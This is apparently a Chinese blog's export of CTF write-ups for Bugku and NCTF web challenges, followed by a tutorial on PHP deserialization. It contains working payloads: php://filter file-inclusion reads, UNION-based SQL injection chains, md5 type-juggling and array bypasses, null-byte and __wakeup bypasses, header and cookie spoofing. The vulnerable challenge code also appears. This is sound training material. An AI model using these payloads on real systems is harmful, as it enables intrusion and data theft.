<p><img src="/2020/09/06/bugku1-10/admin1.png" alt></p>
<p>想到了<code>X-FORWORADED-FOR:127.0.0.1</code></p>
<p>抓包试试</p>
<p>在响应包中发现一段base64编码<code>dGVzdDEyMw==</code> 解密后为test123，猜测为登录密码</p>
<p>结果真对了</p>
<p><img src="/2020/09/06/bugku1-10/admin2.png" alt></p>
<p>当然这题也可以使用爆破的方法做，但是密码字典需要包含test123</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源码发现一段js代码</p>
<p>将最后的eval改成alert(),直接在浏览器中运行弹出结果</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> a=<span class="built_in">document</span>.getElementById(<span class="string">"password"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"undefined"</span>!=<span class="keyword">typeof</span> a)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line"><span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">alert(<span class="string">"Error"</span>);</span><br><span class="line">a.focus();</span><br><span class="line"><span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/06/bugku1-10/web4.png" alt></p>
<p><code>if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)</code></p>
<p>直接输入67d709b2b54aa2aa648cf6e87a7114f1</p>
<p><img src="/2020/09/06/bugku1-10/web41.png" alt></p>
<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>题目已经提示了flag的位置应该在index.php中，那么获取index.php的源码就很关键，可是查看源码什么也没有</p>
<p>注意到了url:<a href="http://123.206.87.240:8005/post/index.php?file=show.php" target="_blank" rel="noopener">http://123.206.87.240:8005/post/index.php?file=show.php</a></p>
<p>出现file这个参数，想到了文件包含的漏洞</p>
<p>用下面的payload,获取index.php，源码的base64值</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">PGh<span class="number">0</span>bWw+DQogICAgPHRpdGxlPkJ<span class="number">1</span>Z<span class="number">2</span>t<span class="number">1</span>LWN<span class="number">0</span>ZjwvdGl<span class="number">0</span>bGU+DQogICAgDQo<span class="number">8</span>P<span class="number">3</span>BocA<span class="number">0</span>KCWVycm<span class="number">9</span>yX<span class="number">3</span>JlcG<span class="number">9</span>ydGluZygwKTsNCglpZighJF<span class="number">9</span>HRVRbZmlsZV<span class="number">0</span>pe<span class="number">2</span>VjaG<span class="number">8</span>gJzxhIGhyZWY<span class="number">9</span>I<span class="keyword">i4</span>vaW<span class="number">5</span>kZXgucGhwP<span class="number">2</span>ZpbGU<span class="number">9</span><span class="keyword">c</span><span class="number">2</span>hvdy<span class="number">5</span>waHAiPmNsaWNrIG<span class="number">1</span>lPyBubzwvYT<span class="number">4</span>nO<span class="number">30</span>NCgkkZmlsZT<span class="number">0</span>kX<span class="number">0</span>dFVFsnZmlsZSddOw<span class="number">0</span>KCWlmKHN<span class="number">0</span>cnN<span class="number">0</span>cigkZmlsZSwiL<span class="keyword">i4</span>vIil<span class="number">8</span>fHN<span class="number">0</span>cmlzdHIoJGZpbGUsICJ<span class="number">0</span>cCIpfHxzdHJpc<span class="number">3</span>RyKCRmaWxlLCJpbnB<span class="number">1</span>dCIpfHxzdHJpc<span class="number">3</span>RyKCRmaWxlLCJkYXRhIikpew<span class="number">0</span>KCQllY<span class="number">2</span>hvICJPaCBubyEiOw<span class="number">0</span>KCQlleGl<span class="number">0</span>KCk<span class="number">7</span>DQoJfQ<span class="number">0</span>KCWluY<span class="number">2</span><span class="keyword">x</span><span class="number">1</span>ZGUoJGZpbGUpOyANC<span class="keyword">i8</span>vZmxhZzpmbGFne<span class="number">2</span>VkdWxjbmlfZWxpZl<span class="number">9</span>sYWNvbF<span class="number">9</span>zaV<span class="number">9</span>zaWh<span class="number">0</span>fQ<span class="number">0</span>KPz<span class="number">4</span>NCjwvaHRtbD<span class="number">4</span>NCg==</span><br></pre></td></tr></table></figure>

<p>解码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;</span><br><span class="line">  </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>获取flag{edulcni_elif_lacol_si_siht}</p>
<h2 id="请输入密码"><a href="#请输入密码" class="headerlink" title="请输入密码"></a>请输入密码</h2><p>提示了5位数的密码，直接爆破</p>
<p><img src="/2020/09/06/bugku1-10/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81.png" alt></p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>打开题目后，出现一段代码，应该是md5值，可是解码为空密码</p>
<p>扫描目录<code>python dirsearch.py  -u http://123.206.87.240:8002/web16/ -e php</code></p>
<p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD1.png" alt></p>
<p>发现了<code>index.php.bak</code></p>
<blockquote>
<p>这个应该是在编辑这个文件时，自动生成的备份文件；<br>EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；<br>如果编辑后没有什么问题；<br>可以删除.BAK文件             (来自百度)</p>
</blockquote>
<p>下载.bak文件打开后，发现源码，开始审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);<span class="comment">//对key进行了过滤</span></span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;<span class="comment">//这里需要使用md()函数对数组处理时的漏洞</span></span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>url:<code>http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss</code></p>
<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.利用==比较漏洞</p>
<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p> 下列的字符串的MD5值都是0e开头的：</p>
<pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre><p><img src="/2020/09/06/bugku1-10/%E5%A4%87%E4%BB%BD.png" alt></p>
<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1' and 1=1 #      </span><br><span class="line">  </span><br><span class="line">1' and 1=2 #</span><br></pre></td></tr></table></figure>
<p>   不显示内容，可以判断存在注入点</p>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4 #可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4 #</code>可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`

  database:skctf_flag</code></pre><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p>
<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
<p> 得到flag</p>
<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><p>看到题目就知道需要用python的脚本来做（菜鸡不配），网上找的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/qiumingshan/'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">requestpage = r.get(url)</span><br><span class="line">ans=re.findall(<span class="string">'&lt;div&gt;(.*?)=?;&lt;/div&gt;'</span>,requestpage.text)<span class="comment">#获取表达式，我正则写的好像有点问题，多匹配了最后的=?两个字符</span></span><br><span class="line">ans=<span class="string">""</span>.join(ans)<span class="comment">#列表转为字符串</span></span><br><span class="line">ans=ans[:<span class="number">-2</span>]<span class="comment">#去掉最后的=?</span></span><br><span class="line">post=eval(ans)<span class="comment">#计算表达式的值</span></span><br><span class="line">data=&#123;<span class="string">'value'</span>:post&#125;<span class="comment">#构造post的data部分</span></span><br><span class="line">flag=r.post(url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>弱类型</tag>
        <tag>域名解析</tag>
        <tag>md5</tag>
        <tag>爆破</tag>
        <tag>脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf</title>
    <url>/2020/08/29/nctf/</url>
    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><a id="more"></a>

<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>查看源码即可看到flag</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>一道简单的md5漏洞题目</p>
<p><strong>md5函数漏洞</strong></p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line">sha1('aaroZmOk')  </span><br><span class="line">sha1('aaK1STfY')</span><br><span class="line">sha1('aaO8zKZF')</span><br><span class="line">sha1('aa3OFF9m')</span><br></pre></td></tr></table></figure>

<h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母</p>
<p>F12审查元素，修改输入框的<code>maxlength</code>值，大于11即可</p>
<p><img src="/2020/08/29/nctf/qd1.png" alt></p>
<p>再次输入口令即可。</p>
<p>考点为前端代码修改</p>
<h2 id="这题不是WEB"><a href="#这题不是WEB" class="headerlink" title="这题不是WEB"></a>这题不是WEB</h2><p>这道题还真不是web</p>
<p>进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex</p>
<p><img src="/2020/08/29/nctf/%E8%BF%99%E4%B8%8D%E6%98%AFweb.png" alt></p>
<h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p> 题目为层层递进，通过<strong>F12</strong>中<strong>Sources</strong>功能，查看网站的包含情况，发现到可疑地址：<code>SO.html</code>，查看发现相似可以地址，最后在<code>404.html</code>源码中得到<strong>flag</strong>（竖排插入在标签中）： </p>
<p><img src="/2020/08/29/nctf/%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B.png" alt></p>
<h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p><strong>tip:在这里找key</strong></p>
<p>点击发现url改变，跳转到了另一个页面</p>
<p>bp抓包试试，go一下，相应包中出现flag</p>
<p><img src="/2020/08/29/nctf/ds1.png" alt></p>
<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错</p>
<p>将最后的<code>eval</code>改为<code>echo</code>,提交运行即可</p>
<p><img src="/2020/08/29/nctf/echo.png" alt></p>
<p><img src="/2020/08/29/nctf/phpencode.png" alt></p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>黑盒判断方法：<br>单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。</strong> </p>
<p> 根据<strong>PHP伪协议</strong>尝试构造如下<strong>Payload：</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>，将<strong>index.php</strong>的源码经过<strong>Base64编码</strong>输出 </p>
<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
<p>base64解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;&#x2F;title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h2><p>与单身二十年一样，抓包即可</p>
<p><img src="/2020/08/29/nctf/ds2.png" alt></p>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p> <strong>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“</strong>小型文本文件<strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息 。</strong></p>
<p> <strong>TIP: 0==not</strong> </p>
<p>bp抓包，将<code>cookie:login = 0</code>改<code>cookie:login=1</code> go</p>
<p><img src="/2020/08/29/nctf/cookie.png" alt></p>
<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>进入题目，提示robots协议</p>
<p><strong>robots协议也叫robots.txt（统一小写）是一种存放于<a href="https://baike.baidu.com/item/网站" target="_blank" rel="noopener">网站</a>根目录下的<a href="https://baike.baidu.com/item/ASCII" target="_blank" rel="noopener">ASCII</a>编码的<a href="https://baike.baidu.com/item/文本文件" target="_blank" rel="noopener">文本文件</a>，它通常告诉网络<a href="https://baike.baidu.com/item/搜索引擎" target="_blank" rel="noopener">搜索引擎</a>的漫游器（又称<a href="https://baike.baidu.com/item/网络蜘蛛" target="_blank" rel="noopener">网络蜘蛛</a>），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots<a href="https://baike.baidu.com/item/元数据" target="_blank" rel="noopener">元数据</a>（Metadata，又称元数据）。</strong></p>
<p><strong>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</strong></p>
<p>查看robots.txt</p>
<p>url:<code>http://chinalover.sinaapp.com/web11/robots.txt</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">TIP:sql.php</span><br><span class="line"><span class="comment">//这里提示sql.php的源码如下</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形）</p>
<p>之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。</p>
<p> <a href="http://chinalover.sinaapp.com/web11/sql.php?id=10" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/sql.php?id=10</a> 尝试id=10，无结果</p>
<p>id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句</p>
<p>想到了intval()函数的作用，尝试id=1024.1</p>
<h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>宽字节注入，之前写过。</p>
<h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">       <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>试了试<code>?nctf[]=1</code>,出现了报错但是答案真就出来了</p>
<p>正儿八经的做法是<code>?nctf=1%00%23biubiubiu</code>，简单的代码审计</p>
<h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞</p>
<p> <strong>在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。</strong> </p>
<p>payload:</p>
<p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p>
<h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>bp抓包，添加<code>X-Forwarded-For=127.0.0.1</code>,发包即可</p>
<p> <strong>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段</strong> </p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>md5</tag>
        <tag>代码审计</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>反序列化</p>
<a id="more"></a>
<p>PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 </p>
<p>而<strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</strong>wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
<p>serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
<p>unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
<p>举例说明</p>
<pre><code>&lt;?php
class Student{
public $full_name = &apos;zhangsan&apos;;
public $score = 150;
public $grades = array();

function __wakeup() {
echo &quot;__wakeup is invoked&quot;;
}
}

$s = new Student();
var_dump(serialize($s));
?&gt;</code></pre><hr>
<pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre><p>各个符号的含义<br><strong>变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容}</strong></p>
<p>其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br>wakeup()漏洞就是与整个属性个数值有关。<strong>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。</strong></p>
<p>当我们将上述的序列化的字符串中的对象属性个数修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}</p>
<p>最后执行运行的代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $full_name = <span class="string">'zhangsan'</span>;</span><br><span class="line"><span class="keyword">public</span> $score = <span class="number">150</span>;</span><br><span class="line"><span class="keyword">public</span> $grades = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"__wakeup is invoked"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">var_dump(<span class="keyword">$this</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Student();</span><br><span class="line">$stu = unserialize(<span class="string">'O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><p>题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<hr>
